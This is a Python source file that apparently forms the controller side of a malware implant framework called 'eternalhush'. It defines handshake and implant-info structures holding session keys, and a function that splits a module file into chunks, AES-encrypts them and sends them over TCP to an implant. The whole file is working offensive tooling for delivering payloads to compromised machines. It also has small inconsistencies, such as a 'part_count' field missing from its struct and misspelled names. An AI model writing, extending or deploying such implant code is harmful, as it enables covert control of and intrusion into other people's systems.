import eternalhush as eh

MAGIC_VAL1 = 0x6de239bd 
MAGIC_VAL2 = 0x0fd4fb82 

X64_ARCH = 0x8
X32_ARCH = 0x4

HELLO_REQUEST = {
    "val1": eh.LONG,
    "val2": eh.LONG,
    "inital_data": 248
} 

HELLO_RESPONSE = {
    "implant_info": 256,
    "next_iv": 16
}
IMPANT_INFO = {
    "implant_version": eh.LONG,
    "implant_id": eh.LONG,
    "session_key": 32,
    "implant_arch": eh.SHORT,
    "platform_arch": eh.SHORT,
    "implant_platform": eh.SHORT
}

PAYLOADINFO = {
	"payload_size": eh.LONG,
	"payload_type": eh.SHORT,
	"payload_arch": eh.SHORT,
	"padding": 8
}

PAYLOAD = {
    "part_size": eh.SHORT,
    "payload_part": 4094
}

def ExecuteModule(module_name):
    try:
        with open(module_name, "rb") as f:
            content = f.read()
            content = bytearray(content)
    except IOError:
        eh.ui.Echo("Error while opening the file", eh.ECHO_ERROR)
        return   
        
    payload_part_list = list()
    for i in range(0, len(content), 4094):
        payload_part_list.append(content[i:i+4094])
        
    session_key = bytearray.fromhex(eh.ui.GetEnv("CLSP_KEY"))
    next_iv = bytearray.fromhex(eh.ui.GetEnv("CLSP_IV"))
    tcp_connection = int(eh.ui.GetEnv("CLSP_CONNECTION"))
    
    plinfo = eh.data.Struct(PAYLOADINFO)
    plinfo.payload_size = len(content)
    plinfo.payload_type = 0x4
    plinfo.payload_arch = 0x8
    plinfo.part_count = len(payload_part_list)
    encrypted_payload_info = eh.crypto.EncryptAesData(session_key, next_iv, plinfo.data())
    eh.net.TcpSend(tcp_connection, encrypted_payload_info)
        
    for i in range(len(payload_part_list)):
        payload = eh.data.Struct(PAYLOAD)
        payload.part_size = len(payload_part_list[i])
        payload.payload_part = payload_part_list[i]
        encrypted_payload = eh.crypto.EncryptAesData(session_key, next_iv, payload.data())
        eh.net.TcpSend(tcp_connection, encrypted_payload)
    
    empty_payload = eh.crypto.EncryptAesData(session_key, next_iv, b"")
    eh.net.TcpSend(tcp_connection, empty_payload)